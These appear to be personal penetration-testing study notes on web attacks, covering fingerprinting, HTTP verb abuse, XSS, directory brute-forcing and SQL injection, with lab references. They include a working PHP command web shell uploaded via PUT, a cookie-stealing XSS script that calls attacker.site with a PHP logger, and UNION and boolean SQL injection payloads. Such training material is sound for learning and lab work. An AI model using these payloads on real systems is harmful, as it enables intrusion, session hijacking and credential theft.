#webattack
Fingerprinting
detecting daemon/version/OS
Manual vs Automatic

Netcat
Manually send request - banner grabbing
(connect to a listening daemon and read the banner it sends back to your client)

```nc <target address> <port>```
nc 198.251.7.8 80
HEAD /HTTP/1.0
	blankline
	blankline
Note:
two blank lines needed after header to show that the body is below those lines,(body is blank here) 
requests musts be in uppercase!!!
netcat does not provide encryption so cant connect to https daemon (conenciton will be dropped)

Normal response below
HTTP/1.1 200 OK
Date: .....
Server: Apache/...... (Red Hat) etc
Vary: Accept-Encoding
Connection: close
Content-Type: text/html;charset=UTF-8


OpenSSL
manual fingerprinting with encryption so HTTPS is possible!!
``` bash
openssl s_client -conenct <target.site>:443
HEAD / HTTP/1.0
```

Httprint 
web server fingerprinting tool using signature-based technique to identify web servers
```bash
httpinrt -P0 -h <target hosts> -s <signature file>
```

-p0 to avoid pinging the host (most web servers do not respong to ping echo requests)
-h target hosts
-s set signature file to use eg /usr/share/httpint/signatures.txt

### HTTP verbs
Skeleton for a request:
METHOD /smt1 HTTP/1.1
Host: www.something.site


body body
body body

common methods:
- GET
	- to open webpage
		- /page.php at smt1
	- pass argumetns to the app
		- /page.php?course=somecoursephysics
- POST
	- submit html form data
	- POST parameters must be in message body
	- in body, username=john&password=mypass
- PUT
	- upload a file to server
	- Dangerous if allowed and misconfigured
	- in body,  "< PUT data>"
- HEAD
	- Similar to GET as asks just headers of the response
- DELETE
	- remove file form server
	- easily misused for DOS attacks
	- DELETE /path/to/destinationfolder  etc
- Options
	- query for enabled http methods
### Note:
Rest APIs
#RESTAPI 
- Representational State Transfer Application Programming Interface
- web app that relies strongly on HTTP Verbs
- often refered as web services or APIs
	- has subverted functionality (eg using PUT to save data not for saving files etc)
	- MUST double confirm that the PUT method found during pentest is not just a REST API's PUT method that simply creates new content (try look for the file after issuing a PUT request to confirm)
Using HTTP 1.0 instead of 1.1 you can skip sending Host: header

Methodology
#webmethodology
1. Send a Options message with netcat etc
2. Test the available verbs (eg DELETE /login.php returns a 200 OK means page is compromised)
```
nc victim.site 80
PUT /shell.php HTTP/1.0
Content-type: text/html
Content-length: 20
```
content Length can be found using wc -m shell.php 
-m : how long the content is in bytes

Upload PHP shell below with PUT  (place in the body of request, the /shell.php will be the name of the file created in / directory)
```php
<?php
if (isset($_GET['cmd']))
{
	$cmd = $_GET['cmd'];
	echo '<pre>';
	$result = shell_exec($cmd);
	echo $result;
	echo '</pre>';
}
?>
```
on the PHP site
run in browser:
victim.site/shell.php?cmd=command
shell.php -> name of file
?cmd = command ->sets the parameter for cmd 

The shell should have same permissions as the webserver it runs on


## Dirbuster/ Dirb(cli version)
Dirbuster:
Javaapp. Pretty intuitive. has recursive scans advanced options and pure brutefore without list
Can also specify layer to fuzz instead of starting at root directory ie can do /afterlogin/start instead of /

Dirb
Basic command line stuff
-X can provide extension (can be anything u wanna add at the end of what ure using like .php .exe or even ?commad = bruteforced )
-H give a custom header "Myheader:Headersmt"
-a give a specific user-agent to prevent incompatible stuff (ie specify the firefox browser being used)
-u provide authentication ("admin:password1234")
-p using a proxy example burpsuite -p http://127.0.0.1:8080 -c "COOKIE:XYZ"

Google Dorks
#searchhacks
![[Pasted image 20221030180119.png]]
Perform complex search requests like:
-inurl:(htm|html|php|asp|jsp) intitle:"index of" "lastmodified " "parent directory" txt OR doc OR pdf


# Cross Site Scripting
#xss

Look at every possible user input. GET and POST
Burpsuite helps alot to run tru the res of each req (repeater)

<u>Reflected /  Persistent / DOM based </u>
Reflected
Site shows the effect of the scirpt
Eg Inserting `<script>alert(7*7)</script>`
 Anti XSS filters exist that can be bypassed

Persistent XSS
Stored in the server and shown on the site (Like in their comments/posts/pictures etc)
Code gets executed each time page is viewed.
Can be used to run scripts that return seesion cookies allowing unauthenticaed access to user sessions. <script>alert(document.cookie) </script>
```html
<script>
var i = new Image();
i.src = "http://attacker.site/log.php?q="+documetn.cookie; 
</script>
```
 On the attackers site
```php
<?php
$filename="/tmp/log.txt";
$fp=fopen($filename,'a');
$cookie=$_GET ['q'];
fwrite ($fp,$cookie);
fclose($fp);
?>
```

### XSSER Lab

Use burpsuite proxy to determine reqs sent. Both GET and POST are tested

Example XSSER usage:
POST
```bash
`xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'
```
Try Random payloads
```bash
xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto
```
Custom alert payload
```bash
xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"
```
Insert the final payload spit out by XSSER into the POST param in burpsuite
Eg payload,
target_host=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&dns-lookup-php-submit-button=Lookup+DNS

GET
simply put XSS into the GET req
```bash
xsser --url "http://demo.ine.local/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=d&user-poll-php-submit-button=Submit+Vote"
```
Custom payload and final payload same as POST req above.


# SQL injections
#sqlinjection #sqli 

Regular SQL statements
```sql
> SELECT name,description FROM products WHERE id=9;
```

```bash
SELECT <columns list> FROM <table> WHERE <condition>;
#also possible to select constants
SELECT 22, 'string', 0x12, 'another string';
```

UNION
adds a new row below thr first statement 
``` bash
<SELECT statement> UNION <other SELECT statement>;
```

Comments 
# (hash symbol)
--  (2 dashes followed by a space)

Sample static php behind the MYSQL data
```php
$dbhostname = '198.293.5.2';
$dbuser = 'admin';
$dbpwd = 'QWERTY';
$dbname = 'database';

$$connection = mysqli_connect($dbhostname,$dbuser,$dbpwd,$dbname);
$query = "SELECT Name, Decsription FROM Products WHERE ID = '3' UNION SELECT Username,Passwords FROM Accounts;";

$results = mysqli_query($connection, $query);
display_results($results);

```

dynamic php
```php
$id = $_GET['id'];

$connection = mysqli_connnect($dbhostname, $dbuser, $dbpassword, $dbname);
$query = "SELECT Name, Description FROM Products WHERE ID='$id'; ";

$results = mysqli_query($connection ,$query);
display_results($results);

```

Dynamic queries can be injected eg if for above id =' ==' OR 'a'='a== '
the select statement returns all name and descriptions from products where if is TRUE
(ie all the name and dscrps from products are printed)

OR a UNION command to exploit
id = ' =='UNION SELECT Username, Password FROM Accounts Where 'a'= 'a ==';
Possble injections points
GET,POST , HEADERS (User-Agent, Cookie, Accept etc)


Use BURPSUITE to test all possible injection points

## Bolean based injection
Eg Image only appearing if statement is TRUE, if FALSE a error shows
using user() and subtring() to test first letter of username rinse and repeat for all alphanumerics to find the full user name
```sql
select subtring(user(),1,1) = 'a'
```
^ slow bruteforcing technique
example payload :
' or subtr(user(), 1, 1) = 'a
' or subtr(user(), 1, 1) = 'b 
' or subtr(user(), 2, 1) = 'a etc etc

## UNION based injection

payload:
'UNION SELECT user(); -- -' ;

Cool trick used above the comment is 2 dashes, space then a dash as most browsers automatically remove trailing spaces in URL, So for GET req injections need to add a character after the trailing comment space.

### Before UNION injections number of fields used by original select statement must be found with help of boolean 
' UNION SELECT null; -- -
' UNION SELECT null,null; -- - etc

once number of fields found, see which field affects the output page
' UNION SELECT 'field1', 'field2' ; -- -

See which field appears either in the page itself or in the html source code

Note: IRL DELETE descirption FROM items WHERE id = '1' is just as deadly. But less seen in practices.

## SQLMap
Autoinjection tool. Better try manual injection first to not crash the site etc
Get injections using UNION based technique:
```bash
sqlmap -u "http://some.site/view.php?id=1141" -p id --technique=U 
```
POST injectons:
```bash
sqlmap -u "http://some.site/view.php?id=1141" --data=<POST string> -p parameter
```
post string can be taken from burp proxy